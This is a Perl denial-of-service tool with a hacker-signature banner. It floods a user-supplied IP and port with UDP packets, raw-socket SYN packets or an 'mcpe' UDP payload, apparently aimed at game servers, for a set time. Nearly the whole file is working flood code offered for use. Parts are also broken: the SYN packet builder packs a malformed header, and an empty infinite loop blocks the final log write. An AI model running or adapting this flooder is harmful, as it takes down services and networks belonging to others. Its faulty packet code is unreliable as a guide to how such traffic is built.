#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Socket qw(IPPROTO_TCP IPPROTO_IP IPPROTO_UDP IP_HDRINCL SOCK_RAW SOCK_DGRAM PF_INET AF_INET inet_aton pack_sockaddr_in unpack_sockaddr_in);
use Time::HiRes;
use threads;

my $desenho = <<'ASCII';
    
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ                                                       
ϟ_-_ _,,   ,,      ,      ,,                          ϟ
ϟ   -/  )  ||  '  ||      ||          '         _     ϟ
ϟ  ~||_<   || \\ =||= /\\ ||/\ ,._-_ \\  _-_   / \\   ϟ
ϟ   || \\  || ||  ||   /  ||_<  ||   || || \\ || ||   ϟ
ϟ   ,/--|| || ||  ||  /\\ || |  ||   || ||/   || ||   ϟ
ϟ  _--_-'  \\ \\  \\,  || \\,\  \\,  \\ \\,/  \\_-|   ϟ
ϟ (                    /                       /  \   ϟ
ϟ                     (,                      '----`  ϟ
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ
by:kyr1o5 the leper


ASCII


my $ip;
my $port;
my $time;
my $attack_type = 'udp';  # Pode ser 'udp', 'syn', ou 'mcpe'

GetOptions(
    'ip=s' => \$ip,
    'port=i' => \$port,
    'time=i' => \$time,
    'type=s' => \$attack_type,
);

die "Usage: $0 --ip <target_ip> --port <target_port> --time <attack_time> --type <attack_type>\n"
  unless $ip && $port && $time && $attack_type;

print($desenho);
print('Attacke!!');

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton($ip) or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
$endtime = Time::HiRes::time() + $time;
socket(my $flood, PF_INET, SOCK_DGRAM, IPPROTO_UDP);

my $size = 10000;

print "Drücken Sie STRG+C, um den Angriff zu stoppen\n";

if ($attack_type eq 'udp') {
    for (; Time::HiRes::time() <= $endtime; ) {
        $psize = $size ? $size : int(rand(1024 - 64) + 64);
        $pport = $port ? $port : int(rand(65500)) + 1;

        send($flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
    }
} elsif ($attack_type eq 'syn') {
    SYN();
} elsif ($attack_type eq 'mcpe') {
    MCPE();
} else {
    die "Tipo de ataque inválido: $attack_type\n";
}

KILLER();

open(my $log, '>>', 'attack_log.txt') or die "Die Protokolldatei kann nicht geöffnet werden: $!";
print $log "Der Angriff endete em ", scalar localtime, "\n";
close $log;

sub KILLER {
    while (1) {
        #my $thread = threads->create(\&GET);
        #$thread->detach();
    }
}

sub SYN {
    my $s;
    socket($s, PF_INET, SOCK_RAW, IPPROTO_TCP) or die "Não foi possível criar o socket: $!";
    setsockopt($s, IPPROTO_IP, IP_HDRINCL, 1) or die "Não foi possível definir a opção do socket: $!";
    
    my $dest_addr = pack_sockaddr_in($port, $iaddr);
    
    while (send($s, _genrate_syn(), 0, $dest_addr)) {
        next;
    }
    
    close($s);
}




sub MCPE {
    my $payload = "\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f".
                  "\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20".
                  "\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c".
                  "\x73";
    
    my $s;
    socket($s, PF_INET, SOCK_DGRAM, 0) or die "Não foi possível criar o socket: $!";
    
    my $dest_addr = pack_sockaddr_in($port, $iaddr);
    
    while (send($s, $payload, 0, $dest_addr)) {
        next;
    }
    
    close($s);
}



sub _genrate_syn {
    my $src_port = int(rand(65535 - 1024)) + 1024;  # Porta de origem aleatória
    my $seq_num = int(rand(4294967295));             # Número de sequência aleatório
    my $syn_packet = pack("nnNNH8nH2n", $src_port,  # Porta de origem
                                       80,           # Porta de destino (neste exemplo é 80 para HTTP)
                                       $seq_num,     # Número de sequência
                                       0,            # Número de ACK
                                       "A" x 8,      # Dados (8 bytes, apenas para preenchimento)
                                       2,            # Flags: SYN
                                       0);           # Janela de recepção

    return $syn_packet;
}


1;  # Finalizando o módulo
